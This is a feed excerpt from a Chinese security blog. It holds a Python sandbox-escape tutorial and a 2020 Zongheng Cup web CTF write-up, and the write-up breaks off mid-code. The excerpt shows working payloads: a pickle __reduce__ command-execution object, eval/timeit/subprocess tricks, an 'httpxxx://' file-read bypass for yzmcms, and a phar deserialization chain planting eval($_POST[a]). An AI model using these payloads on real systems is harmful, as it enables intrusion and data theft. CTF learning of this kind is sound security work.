    <content type="html"><![CDATA[<h1 id="Python沙箱逃逸">Python沙箱逃逸</h1><p>上一篇写到了关于python flask SSTI的总结文章，看了沙箱逃逸之后，发现这两者的方法和payload很相似，所以把python的沙箱逃逸和服务端模板注入放在一起总结。</p><h2 id="0x01-基础知识">0x01 基础知识</h2><p>沙箱：沙箱是一种按照安全策略限制程序行为的执行环境。</p><p>沙箱逃逸：就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。</p><p>先来给上一道例题源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span>)</span><br><span class="line">banned = [<span class="string">&quot;import&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;pickle&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;kevin sucks&quot;</span>, <span class="string">&quot;input&quot;</span>, <span class="string">&quot;banned&quot;</span>, <span class="string">&quot;cry sum more&quot;</span>, <span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">&#x27;raw_input&#x27;</span>)</span><br><span class="line">targets.remove(<span class="string">&#x27;print&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    data = input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">&quot;No bueno&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># this means nobreak</span></span><br><span class="line">            exec(data)</span><br></pre></td></tr></table></figure><p>一般而言沙箱逃逸的题目考到的知识点无非下面5个：</p><ul><li>python的导包</li><li>python执行代码和命令</li><li>python文件读取</li><li>内置模块</li><li>对象创建于引用</li></ul><p>那么与之相对应的解题思路大致分为5步：</p><ol><li>测试能否导包</li><li>哪些系统包做了限制</li><li>内置函数是否可用</li><li>静态检测or动态检测</li><li>对象之间的引用关系索引</li></ol><h2 id="0x02-花式导包">0x02 花式导包</h2><p>如果我们想在沙箱中getshell的话，必不可少的是要引入Python中执行命令的包，例如os,sys,subprocess等。</p><p>有些沙箱使用比较初级的办法，通过正则对输入代码内容进行过滤，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = open(<span class="string">&#x27;code.py&#x27;</span>).read()</span><br><span class="line">pattern  = re.compile(<span class="string">&#x27;import\s+(os|commands|subprocess|sys)&#x27;</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;forbidden module import detected&quot;</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure><p>这个时候，我们突破这种封锁，首先要学习的是Python的各种导包方法。</p><h3 id="初阶">初阶</h3><p>一般比较常见的是以下几种方法：</p><ul><li>import xxx</li><li>from xxx import *</li><li>_<em>import</em>_(“xxx”)</li><li>importlib库</li><li>imp 库</li><li>reload(xxx)</li></ul><p>第一个和第二个比较熟悉，不用过多赘述，<code>__import__</code>作为一个函数，只能接受字符串参数，返回值可以直接用来操作，通常在动态加载的时候使用这个函数，python2和python3通用：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161327.png" alt=""></p><p>importlib模块是对import和<code>__import__</code>的补充，它也可以通过传入字符串来引入一个模块，python2和python3使用方法一样：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161631.png" alt=""></p><p>imp库的使用方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161942.png" alt=""></p><p>reload 的用法比较有意思，假如沙箱导入了os模块，但是删除了system方法,强行使用system执行命令会报错:<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162046.png" alt=""></p><p>而我又想用system方法执行命令的话，可以使用reload重新加载os模块，恢复对system方法的引用。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162126.png" alt=""></p><h3 id="高阶">高阶</h3><p>导包说到本质上其实是python 读取指定包的py文件，并将其加载到解释器的过程。在模块导入的时候，默认在当前目录下查找，然后再在系统中查找，系统查找的范围是<code>sys.path</code>下的所有路径。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162508.png" alt=""></p><p>我使用的是Anaconda管理python版本，在一些常见的Linux发行版本上，路径一般都是在<code>/usr/lib/python3.X</code>目录下。</p><p>因此我们可以直接执行对应包的文件，从而实现包的导入。在py2中有execfile这个函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162944.png" alt=""></p><p>在python3中没有execfile这个函数，但是又exec，可以通过读文件交给exec执行的方式导入包：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163247.png" alt=""></p><p>上面说到导包的本质是python读取指定的文件，import的本质是：搜索modules并绑定到局部变量</p><p><code>import module_name</code>实质是将<code>module_name.py</code>中的全部代码加载到内存并赋值给与模块同名的变量写在当前文件中，这个变量的类型是<code>module</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163713.png" alt=""></p><p>现在设置一下modules中<code>os</code>的值为None：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163756.png" alt=""></p><p>发现把os从<code>modules</code>中删去就不能直接引入了。但是，我们可以接着设置<code>os</code>的模块的路径，从而引入该模块：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102164329.png" alt=""></p><p>另外，我们将 sys.modules 中的os 删除即可，这样import 发现 sys.modules没有os这个模块，就会重新创建。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102164528.png" alt=""></p><h2 id="0x03-执行代码和命令">0x03 执行代码和命令</h2><h3 id="动态执行代码">动态执行代码</h3><p>(1) eval/exec/execfile</p><p>在上文中，已经讲解了exec/execfile的用法。这里再总结一下：</p><ul><li>exec(source)：动态执行复杂的python代码，函数的返回值永远为None。</li><li>execfile(filename)：执行一个py文件的内容。</li></ul><p>eval用来执行简单的python表达式返回表达式的结果，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>(2) pickle 序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span>    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span>        </span><br><span class="line">    <span class="keyword">import</span> os        </span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">  admin = A()</span><br><span class="line">  B = pickle.dumps(admin)</span><br><span class="line">  print(pickle.dumps(admin))</span><br><span class="line"><span class="comment"># cnt\nsystem\np0\n(S&#x27;whoami&#x27;\np1\ntp2\nRp3\n.</span></span><br></pre></td></tr></table></figure><p>保存序列化之后的字符串，然后通过pickle.loads加载即可完成代码的执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">pickle.loads(<span class="string">&quot;cnt\nsystem\np0\n(S&#x27;whoami&#x27;\np1\ntp2\nRp3\n.&quot;</span>)</span><br></pre></td></tr></table></figure><p>(3) timeit 这个模块是用来测试代码的执行时间的，可以动态执行代码，代码是字符串形式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="执行命令">执行命令</h3><p>(1) os模块</p><p>可以通过os.system(cmd),os.popen(cmd)调用系统命令，例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>(2) commands 模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line">print(commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>))</span><br></pre></td></tr></table></figure><p>(3) subprocess模块</p><p>subprocess模块是相对比较复杂的，有很多执行命令的函数：</p><ul><li>subprocess.run() Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。</li><li>subprocess.call() 执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。</li><li>subprocess.check_call() Python 2.5中新增的函数。执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。</li><li>subprocess.check_output() Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。</li><li>subprocess.getoutput(cmd) 接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</li><li>subprocess.getstatusoutput(cmd) 执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)，其功能类似于commands.getstatusoutput()。</li></ul><p>(4) platform 模块</p><p>可以调用platform 模块 中的 popen 这个函数执行命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">print(platform.popen(<span class="string">&#x27;ls&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,bufsize= <span class="number">-1</span>).read())</span><br><span class="line">platform.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>(5) pty 模块</p><p>pty模块可以生成一个伪终端，可以简单理解为bash，因此是可以执行命令的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ptypty.spawn(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>(6) cgi 模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line">cgi.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-文件读取">0x04 文件读取</h2><h3 id="初阶-v2">初阶</h3><p>(1)open（python2，python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(__file__).read()</span><br></pre></td></tr></table></figure><p>(2)file（python2）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(__file__).read()</span><br></pre></td></tr></table></figure><h3 id="高阶-v2">高阶</h3><p>(1)codecs模块（python2，python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.open(__file__).read()</span><br></pre></td></tr></table></figure><p>(2)types模块（python2）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line">types.FileType(__file__,<span class="string">&#x27;r&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>(3)os.open（python2，python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fd = os.open(__file__, os.O_RDONLY)</span><br><span class="line">print(os.read(fd, <span class="number">1024</span>))</span><br></pre></td></tr></table></figure><p>(4)file协议</p><p>python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">u = urllib.urlopen(<span class="string">&#x27;file:///&#x27;</span>+__file__)</span><br></pre></td></tr></table></figure><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">u = urllib.request.urlopen(<span class="string">&#x27;file:///&#x27;</span>+__file__)</span><br><span class="line">print(u.read())</span><br></pre></td></tr></table></figure><p>(5)fileinput模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">with</span> fileinput.input(files=(__file__,)) <span class="keyword">as</span> f:</span><br><span class="line">  <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    print(line)</span><br></pre></td></tr></table></figure><h2 id="0x05-内建模块">0x05 内建模块</h2><p>如果沙箱不让我们导入外部模块，或者是要导入的模块被禁用，那我们只能求助于Python的内部模块<code>__builtins__</code>( 即Python 本身默认已经导入模块中的函数)。</p><p>dir内置函数可以列出一个模块/类/对象下面所有的属性和函数，查看一下<code>__builtins__</code>中的函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102171409.png" alt=""></p><p>例如，我们可以引用<code>__import__ </code>来导入os，并执行命令：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102171530.png" alt=""></p><p>由于内置模块中的危险函数过多，比如eval,exec等，导致上文使用的沙箱对**<strong>***<em>builtins*</em></strong>****进行了处理，通过 del 关键字将里面的所有函数引用都删除了。</p><p>如果保留reload内置函数，我们还可以通过<code> reload( __builtins__)</code> 恢复，但是现在通过<code>__builtins__</code>来进行逃逸已经不现实了。</p><h2 id="0x06-对象创建与引用">0x06 对象创建与引用</h2><p>删除的是只是函数引用，而不是函数本身，如果你们熟悉C语言的话，函数引用可以理解为函数指针，既然<code>__builtins__</code>中的引用没了，那我们就需要从<strong>其他地方找到敏感函数的引用</strong>，从而实现逃逸。</p><p>关于这一块的内容，其实和flask SSTI的内容是一样的，也是通过python的内置类型的继承链来寻找更多的引用，以下字段是寻找继承链的关键：</p><table><thead><tr><th>名称</th><th>介绍</th></tr></thead><tbody><tr><td><code>__dict__</code></td><td>这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性</td></tr><tr><td><code>__class__</code></td><td>返回一个实例对应的类型</td></tr><tr><td><code>__base__</code></td><td>返回一个类所继承的基类</td></tr><tr><td><code>__subclasses__()</code></td><td>返回该类的所有子类</td></tr><tr><td><code>__mro__</code></td><td>python支持多重继承，在解析<code>__init__</code>时，定义解析顺序的是子类的<code>__mro__</code>属性（值是类的元组）</td></tr><tr><td><code>__slots__</code></td><td>限制类动态添加属性</td></tr><tr><td><code>__getattribute__()</code></td><td>获取属性或方法，对模块和类都有效</td></tr><tr><td><code>__getitem__()</code></td><td>以索引取值或者键取值</td></tr><tr><td><code>__globals__</code></td><td>返回函数所在模块命名空间中的所有变量</td></tr></tbody></table><p>其他的具体内容参考flask SSTI即可。</p><h2 id="0x07-Reference">0x07 Reference</h2><p><a href="https://blog.szfszf.top/article/15/">https://blog.szfszf.top/article/15/</a></p><p><a href="https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></p><p><a href="https://mp.weixin.qq.com/s/f5Ra8BtCyEoJmH0gwuvGXg">https://mp.weixin.qq.com/s/f5Ra8BtCyEoJmH0gwuvGXg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Python沙箱逃逸&quot;&gt;Python沙箱逃逸&lt;/h1&gt;
&lt;p&gt;上一篇写到了关于python flask SSTI的总结文章，看了沙箱逃逸之后，发现这两者的方法和payload很相似，所以把python的沙箱逃逸和服务端模板注入放在一起总结。&lt;/p&gt;
&lt;h2 id=
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="沙箱逃逸" scheme="http://ca0y1h.top/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>纵横杯2020-Web-WriteUp</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/30.%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-Web-WriteUp/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/30.%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-Web-WriteUp/</id>
    <published>2020-12-28T14:09:46.000Z</published>
    <updated>2020-12-28T14:11:09.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="纵横杯2020-Web-WriteUp">纵横杯2020 Web WriteUp</h1><p>题目源码：</p><p>链接: <a href="https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A">https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A</a>  密码: dmqt</p><h2 id="0x01-easycl">0x01 easycl</h2><p>打开题目直接进入登录界面，有admin用户存在，弱密码无效。根据Wappalyzer提示，题目站点使用了CodeIgniter框架，通过比对题目环境的URL和CodeIgniter的三个大版本的源码，猜测应该用的是CodeIgniter4.0。前台登录有盲注存在：      可以用SQLMAP跑出数据库信息，但是进入后台没有什么用。再使用SQLMAP获取sql-shell，可以读取部分文件：        <img src="https://uploader.shimo.im/f/yKNJ4TwZFR1VppPL.png!thumbnail" alt="img">      这道题坑的地方就在于网站根目录不在/var/www/下，通过读取 /etc/apache2/sites-enabled/000-default.conf得到网站根目录/var/sercet/html再用SQL拿到os-shell，搜索flag文件        <img src="https://uploader.shimo.im/f/YEqWl1M66valOfP6.png!thumbnail" alt="img">      读取flag文件        <img src="https://uploader.shimo.im/f/D4FIVx50ohQWkJ4c.png!thumbnail" alt="img"></p><h2 id="0x02-easycms">0x02 easycms</h2><p>www.zip 可以下载源码查看配置文件/common/config/config.php        <img src="https://uploader.shimo.im/f/kNIkXOn14JxnvHhs.png!thumbnail" alt="img">      用admin和admin868可以成功登陆网站后台。<a href="https://www.freebuf.com/vuls/248912.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%90%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AASSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E5%AF%B9%E6%AF%94%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%8F%91%E7%8E%B0%E9%A2%98%E7%9B%AE%E6%8A%8A%E6%BC%8F%E6%B4%9E%E6%8D%A2%E6%88%90%E4%BA%86%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE%EF%BC%9A/core/class/collection.class.php">https://www.freebuf.com/vuls/248912.html这篇文章中提到了一个SSRF漏洞，代码进行对比之后，发现题目把漏洞换成了任意文件读取，文件位置：/core/class/collection.class.php</a>        <img src="https://uploader.shimo.im/f/RSvH1VN5mYRXhU0i.png!thumbnail" alt="img"></p><p>然后打比赛的时候就一直卡在这，现在想想真的是蠢，忘了去看yzmcms的官方issues，我说怎么这么多人做出来了。</p><p>照着这个复现一下就可以打过去：<a href="https://github.com/yzmcms/yzmcms/issues/53">https://github.com/yzmcms/yzmcms/issues/53</a></p><p>找到了洞不知道怎么利用，真的是有够菜的，还是来看看原理。</p><p>当时最大的问题就是不能回显，当时我直接在网址配置中用file协议读文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153535.png" alt=""></p><p>提交之后，点击测试采集，在phpstorm打断点调试，在运行到100行的时候，content中的内容是/etc/passwd的文件内容。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153848.png" alt=""></p><p>但是在调用get_sub_content函数之后，content的值会被改变，我们跟进这个函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228154259.png" alt=""></p><p>这个函数用了两次explode函数把content分割成一个数组，然后返回一个冒号。既然这样，我们知道flag的格式是<code>flag&#123;&#125;</code>那么把<code>start</code>改成<code>f</code>，把<code>end</code>改成<code>&#125;</code>，再经过这个函数处理后就可以保留关键的地方：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201139.png" alt=""></p><p>但是问题又来了，content的内容还要经过get_all_url函数的处理，继续跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201349.png" alt=""></p><p>第65行preg_match_all函数提取a标签中的内容，并且在下面的foreach循环中，会接着提取href元素内容，既然如此，那么我们就把要读取的文件写在a标签的href元素中作为链接，然后封装在一个HTML文件中。</p><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;file:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure><p>模块采集配置：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204207.png" alt=""></p><p>跟进函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203235.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203432.png" alt=""></p><p>但是在第83行还要经过url_check函数的检查，跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203622.png" alt=""></p><p>这个函数内部规定了只允许HTTP或HTTPS协议，于是我们用file协议会直接报错。但这种检查前四个字符的方式未免有些简单粗暴，可以使用一个PHP特性绕过：</p><blockquote><p>When PHP encounters an unknown protocol, it will throw a warning and set the protocol to null. When the Protoco is null or file, the local operation will be carried out. By default, the local file operation will be performed if the protocol is not transferred or the protocol does not exist.</p></blockquote><p>简单来说就是：当PHP遇到一个不存在的协议的时候，会把协议置空，并且当协议为空或者不存在时，会当做文件操作，即file协议。</p><p>既然这样，那我们最后的payload就是：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;httpxxx:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure><p>最后成功返回到content参数中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204406.png" alt=""></p><p>虽然有个warning，但是文件还是读出来了：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204838.png" alt=""></p><h2 id="0x03-hellophp">0x03 hellophp</h2><p>这题也挺简单的，时间都花在上面那道题目了，真的是亏死。。</p><p>重点审计class.php这个文件，应该可以很明显的发现有反序列化的漏洞：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228205833.png" alt=""></p><p>其中tile和comment都是可以控制的，那么利用其中一个变量即可。</p><p>接着需要寻找反序列化的触发点，全局搜索没有unserialize函数后，可以很快的发现admin.php有文件上传功能，那么肯定是要上传phar压缩包触发反序列化，再找文件操作的相关函数，在index.php中有file_exist函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228210143.png" alt=""></p><p>把phar压缩包的路径传入img参数即可触发反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $title;</span><br><span class="line">    <span class="keyword">public</span> $comment;</span><br><span class="line">    <span class="keyword">public</span> $logo_url;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$title, $comment</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title = $title;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;comment = $comment;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$title = <span class="string">&quot;1&#x27;.eval(\$_POST[a]).&#x27;a&quot;</span>;</span><br><span class="line">$comment = <span class="number">456</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="comment">### POP链构造</span></span><br><span class="line"><span class="comment">//@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$A = <span class="keyword">new</span> Config($title, $comment);</span><br><span class="line">$phar-&gt;setMetadata($A);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 